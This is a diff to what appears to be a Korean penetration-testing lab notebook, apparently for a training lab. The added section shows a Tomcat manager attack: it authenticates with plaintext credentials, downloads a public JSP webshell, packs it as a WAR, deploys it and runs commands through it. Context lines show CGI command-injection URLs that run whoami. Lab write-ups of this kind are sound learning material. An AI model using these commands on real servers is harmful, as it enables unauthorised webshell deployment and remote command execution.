@@ -1335,7 +1335,32 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 - `http://10.129.204.227:8080/cgi/welcome.bat?&set`
 - `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
 - `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
-    
+
+### /manager/text
+- `/manager/text`접속 시도.
+```bash
+curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.15.214:8080/manager/text/list
+```
+<img width="1104" height="165" alt="image" src="https://github.com/user-attachments/assets/43165666-8e02-43ef-bff7-75d82c1e4b26" />
+
+<br>
+<br>
+
+- `war`파일 업로드.
+```bash
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+
+zip -r backup.war cmd.jsp
+
+curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war 'http://10.129.15.214:8080/manager/text/deploy?path=backup&update=true'
+```
+
+<br>
+
+```
+curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
+
 </details>
 
 ---
